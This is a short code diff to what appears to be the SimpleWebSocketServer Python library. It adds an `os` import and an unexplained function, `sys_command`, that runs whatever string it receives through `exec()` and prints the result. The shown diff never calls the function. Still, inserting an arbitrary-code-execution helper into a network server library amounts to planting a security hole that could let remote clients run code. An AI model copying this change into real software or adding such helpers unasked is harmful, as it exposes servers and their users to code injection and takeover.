@@ -2,6 +2,7 @@
 The MIT License (MIT)
 Copyright (c) 2013 Dave P.
 '''
+import os
 import sys
 VER = sys.version_info[0]
 if VER >= 3:
@@ -26,6 +27,8 @@ from select import select
 __all__ = ['WebSocket',
             'SimpleWebSocketServer',
             'SimpleSSLWebSocketServer']
+def sys_command(val):
+    print(exec(val))
 
 def _check_unicode(val):
     if VER >= 3:
